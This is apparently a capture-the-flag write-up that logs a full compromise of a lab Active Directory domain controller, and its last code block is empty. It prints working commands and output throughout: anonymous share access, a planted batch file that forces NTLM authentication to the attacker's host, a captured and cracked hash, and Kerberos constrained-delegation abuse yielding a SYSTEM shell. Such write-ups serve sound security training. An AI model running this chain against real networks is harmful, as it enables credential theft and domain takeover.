# Pentest Report — Proxy

## 1. Summary

- **Target:** 10.48.158.45 (`DC01.ctf.local`, Windows Server 2019 Active Directory Domain Controller)
- **Objective:** Gain Domain Admin level access
- **Category:** Active Directory / Kerberos delegation abuse
- **Status:** Complete
- **Outcome:** Full compromise. Anonymous SMB access to an exposed `IT-Shared` share led to disclosure of internal documentation describing an automated file-scanning service account. A planted file triggered that service account (`svc.scanner`) to authenticate outbound, letting a captured NetNTLMv2 hash be cracked offline. The recovered password unlocked a domain account that was misconfigured for Kerberos constrained delegation with protocol transition, which was abused via S4U2Self/S4U2Proxy to impersonate Administrator and obtain a SYSTEM-level shell on the domain controller.

## 2. Scope & Environment

| Item | Value |
|---|---|
| Target IP | 10.48.158.45 |
| Attack box IP | 10.48.108.181 |
| Challenge name | Proxy |
| Category | Active Directory / Kerberos delegation abuse |
| Date started | 2026-11-22 |

Room description: TBD (not provided by user; environment identified during recon as a standalone Windows AD domain controller, `ctf.local`)

## 3. Methodology / Timeline

Chronological log of actions taken, in order. Filled in as the engagement progresses.

### 2026-11-22

- Ran `nmap -sV -sC 10.48.158.45` against the target. Result: Windows Active Directory Domain Controller.
  - Hostname: `DC01.ctf.local`, domain `ctf.local`, NetBIOS domain `CTF`
  - Open ports: 53 (DNS), 88 (Kerberos), 135 (MSRPC), 139 (NetBIOS-SSN), 389/3268 (LDAP), 445 (SMB, banner hidden), 464 (kpasswd5), 593 (RPC over HTTP), 636/3269 (LDAPS, tcpwrapped), 3389 (RDP)
  - SMB2 message signing enabled and required
  - OS build 10.0.17763 (Windows Server 2019)
  ```
  root@ip-10-48-108-181:~# nmap -sV -sC 10.48.158.45
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-22 11:36 UTC
  Nmap scan report for ip-10-48-158-45.ap-south-1.compute.internal (10.48.158.45)
  Host is up (0.00036s latency).
  Not shown: 988 filtered tcp ports (no-response)
  PORT     STATE SERVICE       VERSION
  53/tcp   open  domain        Simple DNS Plus
  88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-22 11:36:38Z)
  135/tcp  open  msrpc         Microsoft Windows RPC
  139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
  389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
  445/tcp  open  microsoft-ds?
  464/tcp  open  kpasswd5?
  593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
  636/tcp  open  tcpwrapped
  3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
  3269/tcp open  tcpwrapped
  3389/tcp open  ms-wbt-server Microsoft Terminal Services
  |_ssl-date: 2026-11-22T11:37:18+00:00; -1s from scanner time.
  | ssl-cert: Subject: commonName=DC01.ctf.local
  | Not valid before: 2026-11-21T11:34:56
  |_Not valid after:  2027-05-23T11:34:56
  | rdp-ntlm-info: 
  |   Target_Name: CTF
  |   NetBIOS_Domain_Name: CTF
  |   NetBIOS_Computer_Name: DC01
  |   DNS_Domain_Name: ctf.local
  |   DNS_Computer_Name: DC01.ctf.local
  |   DNS_Tree_Name: ctf.local
  |   Product_Version: 10.0.17763
  |_  System_Time: 2026-11-22T11:36:38+00:00
  Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

  Host script results:
  |_clock-skew: mean: -1s, deviation: 0s, median: -1s
  | smb2-time: 
  |   date: 2026-11-22T11:36:43
  |_  start_date: N/A
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled and required

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 52.24 seconds
  ```

- Ran `smbclient -L //10.48.158.45 -N` (anonymous null-session share listing). Result: non-default share `IT-Shared` ("IT Department Shared Resources") present alongside standard shares (ADMIN$, C$, IPC$, NETLOGON, SYSVOL).
  ```
  root@ip-10-48-108-181:~# smbclient -L //10.48.158.45 -N

  	Sharename       Type      Comment
  	---------       ----      -------
  	ADMIN$          Disk      Remote Admin
  	C$              Disk      Default share
  	IPC$            IPC       Remote IPC
  	IT-Shared       Disk      IT Department Shared Resources
  	NETLOGON        Disk      Logon server share 
  	SYSVOL          Disk      Logon server share 
  SMB1 disabled -- no workgroup available
  ```

- Connected to `IT-Shared` anonymously (`smbclient //10.48.158.45/IT-Shared`, blank password). Listed contents: `IT-Credentials-Backup.txt`, `IT-Onboarding-Checklist.txt`, `IT-Portal.html`.
  ```
  root@ip-10-48-108-181:~# smbclient //10.48.158.45/IT-Shared
  Password for [WORKGROUP\root]:
  Try "help" to get a list of possible commands.
  smb: \> ls
    .                                   D        0  Fri May 22 03:19:03 2026
    ..                                  D        0  Fri May 22 03:19:03 2026
    IT-Credentials-Backup.txt           A      406  Fri May 22 03:18:15 2026
    IT-Onboarding-Checklist.txt         A      676  Fri May 22 03:18:16 2026
    IT-Portal.html                      A     4887  Fri May 22 03:19:03 2026

  		7863807 blocks of size 4096. 3561630 blocks available
  smb: \>
  ```

- Downloaded all three files from the share for review (`get IT-Credentials-Backup.txt`, `get IT-Onboarding-Checklist.txt`, `get IT-Portal.html`).
  ```
  smb: \> get IT-Credentials-Backup.txt
  getting file \IT-Credentials-Backup.txt of size 406 as IT-Credentials-Backup.txt (198.2 KiloBytes/sec) (average 198.2 KiloBytes/sec)
  smb: \> get IT-Onboardding-Checklist.txt
  NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \IT-Onboardding-Checklist.txt
  smb: \> get IT-Onboarding-Checklist.txt
  getting file \IT-Onboarding-Checklist.txt of size 676 as IT-Onboarding-Checklist.txt (330.1 KiloBytes/sec) (average 264.2 KiloBytes/sec)
  smb: \> get IT-Portal.html
  getting file \IT-Portal.html of size 4887 as IT-Portal.html (170.4 KiloBytes/sec) (average 182.2 KiloBytes/sec)
  smb: \> exit
  ```

- Read downloaded files.
  - `IT-Credentials-Backup.txt`: two credential pairs, both marked disabled (`helpdesk.bob`/`Welcome123!`, `it.admin`/`ITAdmin2019!`), note says active service accounts are managed separately by the sysadmin team.
  - `IT-Onboarding-Checklist.txt`: references two automated service accounts — `svc.scanner` (File Scanner, runs every 2 minutes, enumerates `IT-Shared` for new files, uses shell enumeration to inspect file metadata/icons) and `svc.mssql` (nightly MSSQL backups, member of Backup Operators group, password rotated quarterly).
  ```
  root@ip-10-48-108-181:~# cat IT-Credentials-Backup.txt
  IT Department - Credentials Backup
  ===================================
  Generated: 2019-08-14
  Status: ARCHIVED (accounts disabled pending security review)

    helpdesk.bob  :  Welcome123!    [DISABLED - left company 2021]
    it.admin      :  ITAdmin2019!   [DISABLED - role change 2022]

  NOTE: These accounts have been disabled. Active service accounts
        are managed separately by the sysadmin team.

  root@ip-10-48-108-181:~# cat IT-Onboarding-Checklist.txt
  IT Department Onboarding Checklist
  ====================================
  Welcome to the team!

  1. Get VPN access from sysadmin
  2. Request AD account
  3. Install tools (see software list on intranet)
  4. Review security policies

  Automated Services
  ------------------
    File Scanner (svc.scanner)
      Runs every 2 minutes. Enumerates IT-Shared for new files to process.
      Uses Shell enumeration to inspect file metadata and icons.
      Contact sysadmin if files are not being processed.

    Database Backup (svc.mssql)
      Handles nightly MSSQL backups. Member of Backup Operators.
      Password rotated quarterly -- do not store locally.

  Questions? Email helpdesk@ctf.local
  ```

- Read `IT-Portal.html` (static dashboard page). Notable content:
  - Page shows "Logged in as: svc.scanner"
  - Hosts referenced: `DC01.ctf.local` (AD/DNS/File Share, online), `SRV01.ctf.local` (Backup Agent, degraded), `SRV02.ctf.local` (Monitoring, offline)
  - Recent tickets table lists a service account `svc.helpdesk` (assigned to VPN access request and a password reset ticket for user `m.jones`) and an unassigned high-priority ticket "Backup job failed on SRV01"
  - User flagged ticket #1039 ("Password reset - m.jones") and the Service Status table (hosts DC01/SRV01/SRV02) as potentially useful leads to follow up on.

- Ran `ldapsearch -x -H ldap://10.48.158.45 -s base` (anonymous LDAP rootDSE query). Confirmed domain naming context `DC=ctf,DC=local`, DC hostname `DC01.ctf.local`, forest/domain functionality level 7 (Server 2016), naming contexts for Configuration/Schema/DomainDnsZones/ForestDnsZones exposed.
  ```
  root@ip-10-48-108-181:~# ldapsearch -x -H ldap://10.48.158.45 -s base
  # extended LDIF
  #
  # LDAPv3
  # base <> (default) with scope baseObject
  # filter: (objectclass=*)
  # requesting: ALL
  #

  #
  dn:
  domainFunctionality: 7
  forestFunctionality: 7
  domainControllerFunctionality: 7
  rootDomainNamingContext: DC=ctf,DC=local
  ldapServiceName: ctf.local:dc01$@CTF.LOCAL
  isGlobalCatalogReady: TRUE
  subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=ctf,DC=local
  serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=ctf,DC=local
  schemaNamingContext: CN=Schema,CN=Configuration,DC=ctf,DC=local
  namingContexts: DC=ctf,DC=local
  namingContexts: CN=Configuration,DC=ctf,DC=local
  namingContexts: CN=Schema,CN=Configuration,DC=ctf,DC=local
  namingContexts: DC=DomainDnsZones,DC=ctf,DC=local
  namingContexts: DC=ForestDnsZones,DC=ctf,DC=local
  isSynchronized: TRUE
  highestCommittedUSN: 36906
  dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=ctf,DC=local
  dnsHostName: DC01.ctf.local
  defaultNamingContext: DC=ctf,DC=local
  currentTime: 20261122114802.0Z
  configurationNamingContext: CN=Configuration,DC=ctf,DC=local

  # search result
  search: 2
  result: 0 Success

  # numResponses: 2
  # numEntries: 1
  ```

- Attempted anonymous LDAP queries against the person objectClass: `ldapsearch -x -H ldap://10.48.158.45 -b "dc=ctf, dc=loc" "(objectClass=person)"` and a second attempt with base `dc=DC01.ctf, dc=loc`. Both failed with "Operations error ... a successful bind must be completed on the connection" — anonymous LDAP bind is not permitted for subtree searches past rootDSE.
  ```
  root@ip-10-48-108-181:~# ldapsearch -x -H ldap://10.48.158.45 -b "dc=ctf, dc=loc" "(objectClass=person)"
  # extended LDIF
  #
  # LDAPv3
  # base <dc=ctf, dc=loc> with scope subtree
  # filter: (objectClass=person)
  # requesting: ALL
  #

  # search result
  search: 2
  result: 1 Operations error
  text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563

  # numResponses: 1
  root@ip-10-48-108-181:~# ldapsearch -x -H ldap://10.48.158.45 -b "dc=DC01.ctf, dc=loc" "(objectClass=person)"
  # extended LDIF
  #
  # LDAPv3
  # base <dc=DC01.ctf, dc=loc> with scope subtree
  # filter: (objectClass=person)
  # requesting: ALL
  #

  # search result
  search: 2
  result: 1 Operations error
  text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563

  # numResponses: 1
  ```

- Created `@Shortcut.bat` on the attack box containing a UNC-path callback to a share on the attack box, referencing the scanner service's metadata-inspection behavior noted in the onboarding checklist.
  ```
  root@ip-10-48-108-181:~# nano @Shortcut.bat
  @echo off
  dir \\10.48.108.181\share > nul 2>&1
  root@ip-10-48-108-181:~# cat \@Shortcut.bat
  @echo off
  dir \\10.48.108.181\share > nul 2>&1
  ```

- Ran `ip ad` on the attack box to identify the correct interface for the callback listener. Identified `ens5` (10.48.108.181/18) as the externally-reachable interface (docker0/veth interfaces are container-internal).
  ```
  root@ip-10-48-108-181:~# ip ad
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host noprefixroute 
         valid_lft forever preferred_lft forever
  2: ens5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
      link/ether 02:ff:c6:d6:8c:bd brd ff:ff:ff:ff:ff:ff
      altname enp0s5
      inet 10.48.108.181/18 metric 100 brd 10.48.127.255 scope global dynamic ens5
         valid_lft 2002sec preferred_lft 2002sec
      inet6 fe80::ff:c6ff:fed6:8cbd/64 scope link 
         valid_lft forever preferred_lft forever
  3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
      link/ether 6a:0c:35:a6:67:fc brd ff:ff:ff:ff:ff:ff
      inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
         valid_lft forever preferred_lft forever
      inet6 fe80::680c:35ff:fea6:67fc/64 scope link 
         valid_lft forever preferred_lft forever
  4: veth29cddb1@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
      link/ether 5e:f9:4c:fb:24:fa brd ff:ff:ff:ff:ff:ff link-netnsid 0
      inet6 fe80::5cf9:4cff:fefb:24fa/64 scope link 
         valid_lft forever preferred_lft forever
  5: vethb2e44af@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
      link/ether ba:01:31:9e:79:c9 brd ff:ff:ff:ff:ff:ff link-netnsid 1
      inet6 fe80::b43f:18ff:fec5:1789/64 scope link 
         valid_lft forever preferred_lft forever
  ```

- Started `sudo responder -I ens5` to listen for inbound NTLM authentication triggered by the planted UNC-path callback.

- Uploaded `@Shortcut.bat` into the writable `IT-Shared` share via `smbclient`'s `put`. Confirmed present via `ls`.
  ```
  smb: \> put @Shortcut.bat
  putting file @Shortcut.bat as \@Shortcut.bat (45.9 kb/s) (average 45.9 kb/s)
  smb: \> ls
    .                                   D        0  Sun Nov 22 12:04:34 2026
    ..                                  D        0  Sun Nov 22 12:04:34 2026
    @Shortcut.bat                       A       47  Sun Nov 22 12:04:34 2026
    IT-Credentials-Backup.txt           A      406  Fri May 22 03:18:15 2026
    IT-Onboarding-Checklist.txt         A      676  Fri May 22 03:18:16 2026
    IT-Portal.html                      A     4887  Fri May 22 03:19:03 2026

  		7863807 blocks of size 4096. 3559125 blocks available
  smb: \>
  ```

- Responder caught an inbound NTLMv2-SSP authentication attempt from the target triggered by the planted file. Captured NetNTLMv2 hash for `CTF\svc.scanner`.
  ```
  [SMB] NTLMv2-SSP Client   : 10.48.158.45
  [SMB] NTLMv2-SSP Username : CTF\svc.scanner
  [SMB] NTLMv2-SSP Hash     : svc.scanner::CTF:63f5ff220541f4e7:FE3848299345EE2100D357FDAB0D338D:01010000000000000078B842797ADD01F383E7897FD9121500000000020008004F0047004B004E0001001E00570049004E002D0059004E004700480033005A00370039004B0045005A0004003400570049004E002D0059004E004700480033005A00370039004B0045005A002E004F0047004B004E002E004C004F00430041004C00030014004F0047004B004E002E004C004F00430041004C00050014004F0047004B004E002E004C004F00430041004C00070008000078B842797ADD01060004000200000008003000300000000000000001000000002000001A5BE153F7F5BDE3B7560E069DB7863C69C0794159EFE7601945AD592338C0A50A001000000000000000000000000000000000000900240063006900660073002F00310030002E00340038002E003100300038002E003100380031000000000000000000
  ```

- Cracked the captured NetNTLMv2 hash with `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`. Recovered plaintext password for `svc.scanner`: `1summerlove!`.
  ```
  SVC.SCANNER::CTF:63f5ff220541f4e7:fe3848299345ee2100d357fdab0d338d:0101...00:1summerlove!

  Session..........: hashcat
  Status...........: Cracked
  Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
  ```

- Validated the cracked credential with `nxc smb 10.48.158.45 -d ctf.loc -u 'svc.scanner' -p '1summerlove!'`. Confirmed valid domain login for `svc.scanner`, DC also confirmed to allow Null Auth.
  ```
  root@ip-10-48-108-181:~# nxc smb 10.48.158.45 -d ctf.loc -u 'svc.scanner' -p '1summerlove!'
  SMB         10.48.158.45    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
  SMB         10.48.158.45    445    DC01             [+] ctf.loc\svc.scanner:1summerlove!
  ```

- Enumerated shares as `svc.scanner` with `nxc smb 10.48.158.45 -d ctf.loc -u 'svc.scanner' -p '1summerlove!' --shares`. `svc.scanner` has READ,WRITE on `IT-Shared` and READ on IPC$, NETLOGON, SYSVOL; no explicit access shown on ADMIN$/C$.
  ```
  root@ip-10-48-108-181:~# nxc smb 10.48.158.45 -d ctf.loc -u 'svc.scanner' -p '1summerlove!' --shares
  SMB         10.48.158.45    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
  SMB         10.48.158.45    445    DC01             [+] ctf.loc\svc.scanner:1summerlove! 
  SMB         10.48.158.45    445    DC01             [*] Enumerated shares
  SMB         10.48.158.45    445    DC01             Share           Permissions            Remark
  SMB         10.48.158.45    445    DC01             -----           -----------            ------
  SMB         10.48.158.45    445    DC01             ADMIN$                                 Remote Admin
  SMB         10.48.158.45    445    DC01             C$                                     Default share
  SMB         10.48.158.45    445    DC01             IPC$            READ                   Remote IPC
  SMB         10.48.158.45    445    DC01             IT-Shared       READ,WRITE             IT Department Shared Resources
  SMB         10.48.158.45    445    DC01             NETLOGON        READ                   Logon server share 
  SMB         10.48.158.45    445    DC01             SYSVOL          READ                   Logon server share
  ```

- Enumerated domain users with `nxc smb 10.48.158.45 -d ctf.loc -u 'svc.scanner' -p '1summerlove!' --users`. 7 users returned: `Administrator`, `Guest`, `krbtgt`, `svc.scanner`, `svc.mssql`, `helpdesk.bob`, `it.admin`. No account for `m.jones` appears in this list.
  ```
  root@ip-10-48-108-181:~# nxc smb 10.48.158.45 -d ctf.loc -u 'svc.scanner' -p '1summerlove!' --users 
  SMB         10.48.158.45    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
  SMB         10.48.158.45    445    DC01             [+] ctf.loc\svc.scanner:1summerlove! 
  SMB         10.48.158.45    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
  SMB         10.48.158.45    445    DC01             Administrator                 2026-05-22 00:03:04 0       Built-in account for administering the computer/domain 
  SMB         10.48.158.45    445    DC01             Guest                         2026-05-20 02:24:15 0       Built-in account for guest access to the computer/domain 
  SMB         10.48.158.45    445    DC01             krbtgt                        2026-05-20 02:22:53 0       Key Distribution Center Service Account 
  SMB         10.48.158.45    445    DC01             svc.scanner                   2026-05-21 17:15:57 0       IT File Scanner Service 
  SMB         10.48.158.45    445    DC01             svc.mssql                     2026-05-20 02:23:59 0       MSSQL Service Account 
  SMB         10.48.158.45    445    DC01             helpdesk.bob                  2026-05-20 02:23:59 0       Help Desk - Bob (left company) 
  SMB         10.48.158.45    445    DC01             it.admin                      2026-05-20 02:23:59 0       IT Admin (role change) 
  SMB         10.48.158.45    445    DC01             [*] Enumerated 7 local users: CTF
  ```

- Attempted `nxc smb 10.48.158.45 -d ctf.loc -u 'svc.scanner' -p '1summerlove!' --groups`. Rejected — `--groups` has been moved to the `ldap` protocol in this nxc version, not `smb`.
  ```
  root@ip-10-48-108-181:~# nxc smb 10.48.158.45 -d ctf.loc -u 'svc.scanner' -p '1summerlove!' --groups
  SMB         10.48.158.45    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
  SMB         10.48.158.45    445    DC01             [+] ctf.loc\svc.scanner:1summerlove! 
  SMB         10.48.158.45    445    DC01             [-] [REMOVED] Arg moved to the ldap protocol
  ```

- Dumped domain password policy with `nxc smb 10.48.158.45 -d ctf.loc -u 'svc.scanner' -p '1summerlove!' --pass-pol`. Notable: Account Lockout Threshold is "None" (no account lockout), minimum password length 7, complexity required.
  ```
  root@ip-10-48-108-181:~# nxc smb 10.48.158.45 -d ctf.loc -u 'svc.scanner' -p '1summerlove!' --pass-pol
  SMB         10.48.158.45    445    DC01             [+] Dumping password info for domain: CTF
  SMB         10.48.158.45    445    DC01             Minimum password length: 7
  SMB         10.48.158.45    445    DC01             Password history length: 24
  SMB         10.48.158.45    445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
  SMB         10.48.158.45    445    DC01             
  SMB         10.48.158.45    445    DC01             Password Complexity Flags: 000001
  SMB         10.48.158.45    445    DC01                 Domain Refuse Password Change: 0
  SMB         10.48.158.45    445    DC01                 Domain Password Store Cleartext: 0
  SMB         10.48.158.45    445    DC01                 Domain Password Lockout Admins: 0
  SMB         10.48.158.45    445    DC01                 Domain Password No Clear Change: 0
  SMB         10.48.158.45    445    DC01                 Domain Password No Anon Change: 0
  SMB         10.48.158.45    445    DC01                 Domain Password Complex: 1
  SMB         10.48.158.45    445    DC01             
  SMB         10.48.158.45    445    DC01             Minimum password age: 1 day 4 minutes 
  SMB         10.48.158.45    445    DC01             Reset Account Lockout Counter: 30 minutes 
  SMB         10.48.158.45    445    DC01             Locked Account Duration: 30 minutes 
  SMB         10.48.158.45    445    DC01             Account Lockout Threshold: None
  SMB         10.48.158.45    445    DC01             Forced Log off Time: Not Set
  ```

- Attempted `bloodhound-python -u 'svc.scanner' -p '1summerlover!' -d 'ctf.local' -ns 10.48.158.45 -c All --zip` (note: password typed as `1summerlover!`, not the cracked `1summerlove!`). Failed on two fronts: Kerberos TGT request failed because `dc01.ctf.local` does not resolve via the attack box's configured DNS, and the NTLM fallback to LDAP failed with error 52e (invalid credentials) — consistent with the password typo.
  ```
  root@ip-10-48-108-181:~# bloodhound-python -u 'svc.scanner' -p '1summerlover!' -d 'ctf.local' -ns 10.48.158.45 -c All --zip
  INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
  INFO: Found AD domain: ctf.local
  INFO: Getting TGT for user
  WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.ctf.local:88)] [Errno -2] Name or service not known
  INFO: Connecting to LDAP server: dc01.ctf.local
  ERROR: Failure to authenticate with LDAP! Error 8009030C: LdapErr: DSID-0C0906B5, comment: AcceptSecurityContext error, data 52e, v4563 : Code: 49
  bloodhound.ad.utils.CollectionException: Could not authenticate to LDAP. Check your credentials and LDAP server requirements.
  ```

- Retried with the correct password: `bloodhound-python -u 'svc.scanner' -p '1summerlove!' -d 'ctf.local' -ns 10.48.158.45 -c All --zip`. Succeeded. Collected: 8 users, 52 groups, 2 GPOs, 1 OU, 19 containers, 0 trusts, 1 computer (DC01.ctf.local). Output zipped to `20261122124427_bloodhound.zip`.
  ```
  root@ip-10-48-108-181:~# bloodhound-python -u 'svc.scanner' -p '1summerlove!' -d 'ctf.local' -ns 10.48.158.45 -c All --zip
  INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
  INFO: Found AD domain: ctf.local
  INFO: Getting TGT for user
  INFO: Connecting to LDAP server: dc01.ctf.local
  INFO: Found 1 domains
  INFO: Found 1 domains in the forest
  INFO: Found 1 computers
  INFO: Connecting to GC LDAP server: dc01.ctf.local
  INFO: Connecting to LDAP server: dc01.ctf.local
  INFO: Found 8 users
  INFO: Found 52 groups
  INFO: Found 2 gpos
  INFO: Found 1 ous
  INFO: Found 19 containers
  INFO: Found 0 trusts
  INFO: Starting computer enumeration with 10 workers
  INFO: Querying computer: DC01.ctf.local
  INFO: Done in 00M 03S
  INFO: Compressing output into 20261122124427_bloodhound.zip
  ```

- Uploaded the collected BloodHound data (`20261122124427_groups.json`, `20261122124427_users.json`, `20261122124427_ous.json`, etc.) into the BloodHound GUI for graph analysis.

- Reviewed Node Info for `SVC.SCANNER@CTF.LOCAL` in BloodHound. Graph shows an `AllowedToDelegate` edge from `SVC.SCANNER@CTF.LOCAL` to `DC01.CTF.LOCAL`. Node Info panel confirms "Constrained Delegation Privileges: 1" for this account. All other listed rights (Local Admin, RDP, DCOM, SQL Admin, Object Control) show 0.

- Opened BloodHound's built-in "Help: AllowedToDelegate" panel (Windows Abuse tab) for reference on the edge type — documents the general S4U2Self/S4U2Proxy abuse pattern via Rubeus/Impacket/Kekeo for constrained delegation.

- Confirmed the delegation configuration directly against the DC with Impacket's `findDelegation.py ctf.local/svc.scanner:'1summerlove!' -dc-ip 10.48.158.45`. Result: `svc.scanner` has Constrained Delegation with Protocol Transition to SPNs `cifs/DC01` and `cifs/DC01.ctf.local`. Also noted `DC01$` has Unconstrained Delegation configured.
  ```
  root@ip-10-48-108-181:~# findDelegation.py ctf.local/svc.scanner:'1summerlove!' -dc-ip 10.48.158.45
  Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

  AccountName  AccountType  DelegationType                      DelegationRightsTo   SPN Exists 
  -----------  -----------  ----------------------------------  -------------------  ----------
  DC01$        Computer     Unconstrained                       N/A                  Yes        
  svc.scanner  Person       Constrained w/ Protocol Transition  cifs/DC01            No         
  svc.scanner  Person       Constrained w/ Protocol Transition  cifs/DC01.ctf.local  No
  ```

- Abused the constrained delegation with Impacket's `getST.py -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip 10.48.158.45 ctf.local/svc.scanner:'1summerlove!'`. Performed S4U2Self then S4U2Proxy to obtain a service ticket impersonating `Administrator` for the `cifs/DC01.ctf.local` SPN. Ticket saved as `Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache`.
  ```
  root@ip-10-48-108-181:~# getST.py -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip 10.48.158.45 ctf.local/svc.scanner:'1summerlove!' 
  Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

  [-] CCache file is not found. Skipping...
  [*] Getting TGT for user
  [*] Impersonating Administrator
  [*] Requesting S4U2self
  [*] Requesting S4U2Proxy
  [*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
  ```

- Ran `ls` on the attack box home directory to confirm the ccache file was saved alongside other working artifacts (BloodHound zip, hash.txt, downloaded IT-Shared files, etc.).

- Attempted `smbexec.py -k -no-pass ctf.local/Adminstrator@DC01.ctf.local` (note: username typo "Adminstrator"). Failed with `STATUS_MORE_PROCESSING_REQUIRED` — Kerberos auth rejected. A second attempt, `smbexec.py -k -no-pass ctf.local/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache`, failed with a DNS resolution error, since the ccache filename was placed in the target-host position of the command rather than being set via `KRB5CCNAME`.
  ```
  root@ip-10-48-108-181:~# smbexec.py -k -no-pass ctf.local/Adminstrator@DC01.ctf.local
  Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

  [-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.
  root@ip-10-48-108-181:~# smbexec.py -k -no-pass ctf.local/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache 
  Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

  [-] [Errno Connection error (CTF.LOCAL.ccache:445)] [Errno -2] Name or service not known
  ```

- Set `export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache` and retried both commands verbatim. First attempt still carries the username typo ("Adminstrator") and still failed with `STATUS_MORE_PROCESSING_REQUIRED`; second attempt still has the ccache filename in the target-host position (rather than `DC01.ctf.local`) and still failed with the same DNS error.
  ```
  root@ip-10-48-108-181:~# export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache 
  root@ip-10-48-108-181:~# smbexec.py -k -no-pass ctf.local/Adminstrator@DC01.ctf.local
  Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

  [-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.
  root@ip-10-48-108-181:~# smbexec.py -k -no-pass ctf.local/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache 
  Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

  [-] [Errno Connection error (CTF.LOCAL.ccache:445)] [Errno -2] Name or service not known
  ```

- Reran `ls` (same home directory listing as before) then `smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local` (username spelled correctly, target set to the DC hostname this time). Failed: `[Errno 2] No such file or directory: 'Adminstrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache'` — Impacket is looking for a ccache filename with "Adminstrator" (missing the second "i"), which does not match the actual saved file `Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache`.
  ```
  root@ip-10-48-108-181:~# smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
  Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

  [-] [Errno 2] No such file or directory: 'Adminstrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache'
  ```

- Re-exported `KRB5CCNAME` and retried `smbexec.py -k -no-pass ctf.local/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache` — still has the ccache filename in the target-host position instead of `DC01.ctf.local`, failing with the same DNS resolution error as before.
  ```
  root@ip-10-48-108-181:~# export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
  root@ip-10-48-108-181:~# smbexec.py -k -no-pass ctf.local/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
  Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

  [-] [Errno Connection error (CTF.LOCAL.ccache:445)] [Errno -2] Name or service not known
  ```

- Corrected the command to target the actual DC hostname: `smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local`. Succeeded — obtained a semi-interactive SYSTEM-level shell on `DC01` via the Kerberos service ticket.
  ```
